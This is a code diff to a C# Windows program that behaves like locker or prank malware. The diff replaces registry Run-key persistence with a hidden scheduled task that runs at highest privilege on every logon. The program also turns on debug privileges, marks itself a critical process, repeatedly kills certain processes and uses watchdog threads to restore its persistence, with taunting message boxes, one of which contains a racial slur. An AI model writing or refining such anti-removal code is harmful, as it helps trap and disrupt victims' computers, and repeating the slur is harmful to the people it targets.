@@ -20,12 +20,12 @@ namespace youCantLeavethis
         [STAThread]
         static void Main()
         {
+            Process.EnterDebugMode();
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
             check_if_running();
             new Thread(loop_kill).Start();
             startup();
-            Process.EnterDebugMode();
             make_process_critical();
             new Thread(check_reg).Start();
             new Thread(check_process_status).Start();
@@ -82,13 +82,53 @@ namespace youCantLeavethis
 
         public static void startup()
         {
-            RegistryKey reg = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-            reg.SetValue("CET", Application.ExecutablePath, RegistryValueKind.String);
-            reg.Close();
-            reg = Registry.LocalMachine.CreateSubKey("SOFTWARE\\CET", true);
-            reg.SetValue("state", "asiodhasiudgiu", RegistryValueKind.String);
-            reg.Close();
+            string taskName = "CET";
+            string exePath = Application.ExecutablePath;
 
+            // schtasks nie pyta o UAC jeśli już mamy admina
+            ProcessStartInfo psi = new ProcessStartInfo
+            {
+                FileName = "schtasks",
+                Arguments = $"/create /f /tn \"{taskName}\" /sc onlogon /rl highest /tr \"\\\"{exePath}\\\"\"",
+                WindowStyle = ProcessWindowStyle.Hidden,
+                CreateNoWindow = true
+            };
+
+            Process.Start(psi)?.WaitForExit();
+        }
+
+        public static void stop_startup()
+        {
+            string taskName = "CET";
+            string exePath = Application.ExecutablePath;
+
+            // schtasks nie pyta o UAC jeśli już mamy admina
+            ProcessStartInfo psi = new ProcessStartInfo
+            {
+                FileName = "schtasks",
+                Arguments = $"/delete /f /tn \"{taskName}\"",
+                WindowStyle = ProcessWindowStyle.Hidden,
+                CreateNoWindow = true
+            };
+
+            Process.Start(psi)?.WaitForExit();
+        }
+
+        private static bool task_exists()
+        {
+            ProcessStartInfo psi = new ProcessStartInfo
+            {
+                FileName = "schtasks",
+                Arguments = "/query /tn \"CET\"",
+                WindowStyle = ProcessWindowStyle.Hidden,
+                CreateNoWindow = true,
+                RedirectStandardOutput = true,
+                UseShellExecute = false
+            };
+
+            Process p = Process.Start(psi);
+            p.WaitForExit();
+            return p.ExitCode == 0; // 0 = task istnieje, 1 = nie ma
         }
 
         static private void loop_kill()
@@ -101,25 +141,10 @@ namespace youCantLeavethis
                     foreach (Process proc in Process.GetProcessesByName(process))
                     {
                         proc.Kill();
-                        MessageBox.Show($"{process} really?? i expected more from you.");
+                        MessageBox.Show($"{process} really?? i expected more from you.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                     }
                 }
                 Thread.Sleep(20);
-            }
-        }
-
-        static private bool first_start()
-        {
-            RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\CET", true);
-            var state = reg.GetValue("state");
-            reg.Close();
-            if (state == null) {
-                return true;
-            } 
-            
-            else
-            {
-                return false;
             }
         }
 
@@ -129,14 +154,11 @@ namespace youCantLeavethis
         {
             while (is_running_r)
             {
-                RegistryKey reg = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
-                if (reg.GetValue("CET") == null || reg.GetValue("CET").ToString() != Application.ExecutablePath)
+                if (!task_exists())
                 {
-                    reg.Close();
                     startup();
-                    MessageBox.Show("Alright this is a good try but not good enough :(");
+                    MessageBox.Show("Alright this is a good try but not good enough :(", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                 }
-                reg.Close();
                 Thread.Sleep(200);
             }
         }
@@ -153,7 +175,7 @@ namespace youCantLeavethis
             while (is_running_p) {
                 if (!check_if_critical_process())
                 {
-                    MessageBox.Show("Damn you're very very i mean VERY good but still i dont think you can beat me :P");
+                    MessageBox.Show("Damn you're very very i mean VERY good but still i dont think you can beat me :P", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                     make_process_critical();
                 }
                 Thread.Sleep(200);
@@ -173,7 +195,7 @@ namespace youCantLeavethis
             {
                 if (count == 1)
                 {
-                    MessageBox.Show("Nigga its already running");
+                    MessageBox.Show("Nigga its already running", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                     Process.GetCurrentProcess().Kill();
                 }
                 count++;
@@ -183,11 +205,7 @@ namespace youCantLeavethis
         static public void fix()
         {
             stop_checking_reg();
-            RegistryKey reg = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-            reg.DeleteValue("CET");
-            reg = Registry.LocalMachine.CreateSubKey("SOFTWARE\\CET", true);
-            reg.DeleteValue("state");
-            reg.Close();
+            stop_startup();
             stop_checking_proc();
             make_process_not_critical();
             Process.GetCurrentProcess().Kill();
